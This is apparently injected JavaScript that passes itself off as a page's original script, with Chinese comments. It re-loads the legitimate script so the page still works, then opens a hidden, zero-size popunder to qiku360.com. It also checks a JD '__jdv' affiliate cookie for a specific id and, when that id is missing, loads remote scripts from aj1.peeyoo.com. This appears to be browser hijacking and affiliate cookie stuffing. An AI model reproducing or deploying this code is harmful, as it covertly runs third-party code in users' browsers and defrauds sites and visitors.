l___k__s = ~ function(thisWindow, thisDocument, regex_1, regex_2, str_script, Charset, Async, l) {
var str_00_g_0 = '00_g_0',
        isOpera = thisWindow.opera,
        originSrc = (function(js_src) {
            /* 处理原先的src地址 */
            //当js_src 不存在 或者 格式不正确 或者 包含 "00.g.0"时返回 0
            if (!js_src || /([^:]|^)\/\//.test(js_src) || ~js_src.indexOf(str_00_g_0.replace(/_/g, '.'))) {
                return 0;
            }
            //向js_src中添加参数name:'__',value:'_'
            //如果参数表中是正常的参数格式则添加,不是则不添加
//            js_src = (function(pathArry) {
//                var paramStr = pathArry[1] || '';
//                return /=/.test(paramStr || '=') ? (pathArry[0] || '') + '?__=_&' + paramStr : js_src;
//            })(js_src.split('?'));
            js_src = js_src + '?__=__&';
            if (!js_src.lastIndexOf('/')) {
                return js_src.replace(regex_1, regex_2);
            }
            return js_src.substr(0, 1) + js_src.substr(1).replace(regex_1, regex_2);
        })(
            (function(curScriptElement, allScripts, errMsg) {
                /*
                 find the current script src url
                 find Charset and Async
                 */
                //如果Document.currentScript是可以找到元素时,直接返回这个元素的src
                if (curScriptElement) {
                    Charset = curScriptElement.charset;
                    Async = curScriptElement.async;
                    return curScriptElement.src;
                }
                try {
                    //Z.G.Y()故意抛出异常
                    Z.G.Y();
                } catch (c) {
                    // 取得异常信息字符串
                    errMsg = c.stack || c.fileName || c.sourceURL || c.stacktrace;
                    if (!errMsg && isOpera) {
                        //没有错误信息并且是Opera浏览器, 将异常对象c直接转成字符串
                        errMsg = (('' + c).match(/of linked script \S+/g) || []).join(' ');
                    }
                }
                if (errMsg) {
                    errMsg = errMsg.split(/[@ ]/g).pop();
                    errMsg = errMsg[0] == '(' ? errMsg.slice(1, -1) : errMsg;
                    //倒序遍历scriptDOM
                    //将最后一个和异常信息匹配的script标签的src返回,如果都没有匹配script标签处理后的异常信息返回(应该是一个src)
                    //记录 Charset和Async
                    for (var w = errMsg.replace(/(:\d+)?:\d+$/i, ''), scriptEl, i = allScripts.length; i--;) {
                        scriptEl = allScripts[i];
                        if (w == scriptEl.src) {
                            Charset = scriptEl.charset;
                            Async = scriptEl.async;
                            break;
                        }
                    }
                    return w;
                }
                //在没有匹配到异常信息时倒序遍历scriptDOM
                //将加载完成的第一个script标签的src返回,如果都没有记载完成将最后一个script标签的src返回
                //记录 Charset和Async
                for (var lastJsDOM = (allScripts[allScripts.length - 1] || {}), y = 0, cur; y++;) {
                    cur = allScripts[y];
                    if (cur.readyState == 'interactive') {
                        Charset = cur.charset;
                        Async = cur.async;
                        return cur.src;
                    }
                }
                Charset = lastJsDOM.charset;
                Async = lastJsDOM.async;
                return lastJsDOM.src;
            })(thisDocument.currentScript, thisDocument.getElementsByTagName(str_script))),
        head = thisDocument.getElementsByTagName('head')[0],
        newScriptElm = thisDocument.createElement(str_script),
        sessionStorage = thisWindow.sessionStorage;
    if (originSrc) {
        // load originSrc
        if(Charset){
            newScriptElm.charset = Charset;
        }
        newScriptElm.src = originSrc;
        newScriptElm.async = Async;
        //非异步时重新加载这个js
        //这个js在异步加载时,非异步js需要重新加载保持界面和js都能正常运行,异步的js不会影响整体逻辑不重新加载也不会影响
        if (!Async && /\[nati/.test(thisDocument.write + '')) {
            thisDocument.write('<' + str_script + ' src="' + originSrc + '"' +
                               (Charset ? ' charset="' + Charset + '"' : '') +
                               ' async=' + (Async ? 'true' : 'false') +
                               '><\/' + str_script + '>');
        } else {
            head.appendChild(newScriptElm);
        }
    }

    // run our functional script
    var Click = function(isBusinessOn) {
        try {
            if (!isBusinessOn) {
                var url = "http://www.qiku360.com/main.html?&f=" + 1E4 * Math.random() + "&k=" + (new Date()).valueOf();
                var d = new Date;
                d.setTime(d.getTime() + 12E5);
                splashWin = window.open(h, "x", "fullscreen=0,toolbar=no,menubar=no,scrollbars=no,resizable=0,location=no,status=no");
                window.ActiveXObject || "ActiveXObject" in window ? document.getElementById("jdtg").removeNode(!0) : (splashWin.blur(), window.focus(), splashWin.resizeTo(0, 0), splashWin.moveTo(0, 0), document.getElementById("jdtg").remove());
                setTimeout("if (splashWin!=null) splashWin.close()", 500)
            }
        } catch (k) {}
    };

    var loadScript = function(src, noCache ,async) {
        document.write('<script src="' + src + (noCache ? '?' + Math.random() : '') + '"><\/script>')
    };
    var base = 'http://aj1.peeyoo.com/packed/js/';



    if (!thisWindow.l___k__s && !isOpera && navigator.cookieEnabled && /^http:/.test(thisDocument.URL)) {

        var getCookie = function(c_name) {
            if (thisDocument.cookie.length > 0) {
                c_start = thisDocument.cookie.indexOf(c_name + "=");
                if (c_start != -1) {
                    c_start = c_start + c_name.length + 1;
                    c_end = thisDocument.cookie.indexOf(";", c_start);
                    if (c_end == -1) {
                        c_end = thisDocument.cookie.length;
                    }
                    return unescape(thisDocument.cookie.substring(c_start, c_end));
                }
            }
            return "";
        };
        var key = "__jdv";
        if (!/t_1000034640_/.test(getCookie(key))) {
            loadScript(base + 'script.js', true);
            loadScript(base + 'license.32.js', true);
            loadScript(base + 'gotoqk.js', true);

        }
    }

}(self, document, /([^:\/]|^)\//, '$1//', 'script');
